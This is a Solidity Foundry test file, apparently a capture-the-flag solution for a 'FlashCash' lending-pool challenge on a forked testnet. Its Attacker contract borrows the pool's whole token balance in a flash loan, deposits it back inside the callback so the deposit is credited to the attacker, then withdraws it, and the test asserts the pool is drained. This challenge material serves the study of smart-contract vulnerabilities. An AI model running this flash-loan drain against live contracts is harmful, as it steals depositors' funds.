// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {LendingPool} from "src/v2/flash-cash/LendingPool.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IFlashLoanEtherReceiver {
    function execute() external;
}

contract Attacker is IFlashLoanEtherReceiver {

    LendingPool public lendingPool;

    constructor(address _lendingPoolAddress) {
        lendingPool = LendingPool(_lendingPoolAddress);
    }

    function withdraw() public {
        lendingPool.withdraw();
    }

    function flashloan() public {
        uint256 _balance = IERC20(lendingPool.DNVR()).balanceOf(address(lendingPool));
        lendingPool.flashLoan(_balance);
    }

    function execute() external override {
        uint256 _balance = IERC20(lendingPool.DNVR()).balanceOf(address(this));
        IERC20(lendingPool.DNVR()).approve(address(lendingPool), _balance);
        lendingPool.deposit(_balance);
    }
}

contract FlashCashChallenge is Test {

    Attacker private _attacker;

    LendingPool private _lendingPool;

    IERC20 public constant DNVR = IERC20(0x84BbB983D8cF2F58bd9b2dE794a489d2e9798668);

    function setUp() external {

        vm.selectFork(vm.createFork(vm.envString("CARDONA_RPC_URL")));

        address _lendingPoolAddress = address(0); // TODO
        _lendingPool = LendingPool(_lendingPoolAddress);

        _attacker = new Attacker(_lendingPoolAddress);
    }

    function testSolution() external {

        /** PRE ATTACK ASSERTS */

        assertTrue(DNVR.balanceOf(address(_lendingPool)) > 0, "FlashCashChallenge: LendingPool has no balance");
        assertTrue(DNVR.balanceOf(address(_attacker)) == 0, "FlashCashChallenge: attacker already has a balance");

        uint256 _lendingPoolBalanceBefore = DNVR.balanceOf(address(_lendingPool));

        /** ATTACK */

        _attacker.flashloan();
        _attacker.withdraw();

        /** POST ATTACK ASSERTS */

        assertTrue(DNVR.balanceOf(address(_attacker)) >= _lendingPoolBalanceBefore, "FlashCashChallenge: attacker did not steal enough");
        assertTrue(DNVR.balanceOf(address(_lendingPool)) == 0, "FlashCashChallenge: LendingPool still has a balance");
    }
}